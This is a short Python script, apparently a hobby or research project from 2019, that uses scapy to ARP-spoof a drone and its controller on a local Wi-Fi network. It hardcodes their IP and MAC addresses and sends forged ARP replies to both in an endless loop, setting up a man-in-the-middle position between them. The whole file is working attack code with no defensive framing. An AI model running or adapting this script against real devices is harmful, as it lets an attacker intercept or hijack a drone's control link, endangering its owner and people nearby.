# Writer: Gal Harari
# Date: 23/05/2019$
from scapy.all import *
import signal
from scapy.layers.l2 import ARP
from scapy.layers.inet import IP, UDP, Ether
from get_control import get_mac

handler_ip = '192.168.10.2'
handler_mac = 'ec:d0:9f:fd:1b:25'
drone_ip = '192.168.10.1'
drone_mac = '60:60:1f:c4:3d:ba'
drone_base = Ether(dst=drone_mac)
handler_base = Ether(dst=handler_mac)
my_mac='00:26:bb:18:b8:e5'

if __name__ == "__main__":
    my_mac = '00:26:bb:18:b8:e5'

    handler_ip = '192.168.10.2'
    handler_mac = 'ec:d0:9f:fd:1b:25'
    drone_ip = '192.168.10.1'
    drone_mac = '60:60:1f:c4:3d:ba'
    bcast_base = Ether(dst='ff:ff:ff:ff:ff:ff')
    #print(get_mac(handler_ip))
    drone_base = Ether(dst=drone_mac)
    handler_base = Ether(dst=handler_mac, src=my_mac)
	
    spoof_drone_pkt = drone_base / ARP(op=2, hwdst=drone_mac, pdst=drone_ip,
                          psrc=handler_ip)
    spoof_handler_pkt = handler_base / ARP(op=2, hwdst=handler_mac, pdst=handler_ip, psrc=drone_ip)
    _spoof_drone_pkt = bcast_base / ARP(op=2, pdst=handler_ip, psrc=handler_ip)
    _spoof_handler_pkt = bcast_base / ARP(op=2, pdst=drone_ip, psrc=drone_ip)

    while True:
        print("Sending ARP...")
        sendp(spoof_handler_pkt, iface='en1')
        sendp(spoof_drone_pkt, iface='en1')
        # sniff_filter = f"ip host {handler_ip}"

        time.sleep(0.05)
